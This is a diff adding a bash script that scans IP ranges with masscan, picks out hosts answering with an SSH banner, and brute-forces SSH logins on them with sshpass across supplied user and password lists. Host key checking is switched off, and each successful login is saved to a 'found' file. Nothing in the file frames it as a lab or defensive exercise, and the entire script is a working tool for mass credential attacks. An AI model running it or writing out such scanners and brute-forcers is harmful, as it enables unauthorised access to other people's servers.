@@ -1,0 +1,32 @@
+#!/bin/bash
+
+read -e -p "Ip range list: " targets
+read -e -p "Port to scan: " port
+read -e -p "Rate MasScan: " rscan
+read -e -p "Numbers of Threads (Check SSH Scan): " threads
+read -e -p "Number of Simultaneous Connections (Brute Force): " threads_bf
+read -e -p "Users List: " user
+read -e -p "Passwords List: " pass
+echo "Start MasScan..."
+masscan -iL $targets -p$port -oG masscan.log --rate $rscan
+cat masscan.log | awk '/open/{print $2 " " $5}'| sed -e "s/open//g"| sed -e "s/tcp//g" | cut -d "/" -f1| sed "s/ / /g" >>tmportip.log
+sort tmportip.log | uniq >>tmp1ortip.log
+awk '!a[$1]++' tmp1ortip.log >>portip.log
+echo "Start Check SSH Scan..."
+xargs -a portip.log -n 2 -P $threads sh -c 'sleep 1 | telnet $0 $1 2>&1 | grep -ne SSH >/dev/null && echo "$0 $1" >>sshfile.log'
+echo "Starting Brute Forcing..."
+count=0
+for i in $(cat $pass); do
+for u in $(cat $user); do
+xargs -a sshfile.log -n 2 -P $threads_bf sh -c 'echo trying '$u' '$i' $0 $1; sshpass -p '$i' ssh -o StrictHostKeyChecking=no '$u'@$0 -p $1 uname -a  >> check-$0-$1-'$u'-'$i''
+if [[ $(cat check-* ) != "" ]]; then 
+find check-* -type f -empty | xargs rm -rf $1
+for file in check-*; do mv "$file" "found.$file"; done
+let count++;
+echo  found $count; 
+fi;
+done done
+find check-* -type f -empty | xargs rm -rf
+echo  "found logins: ls found*" 
+
+#for n in $(pgrep telnet); do s=$(ps -p $n -o etime | grep 0);if [[ "$s" > "00:10" ]]; then kill $n; fi; done  ##kill process if run more 10sec
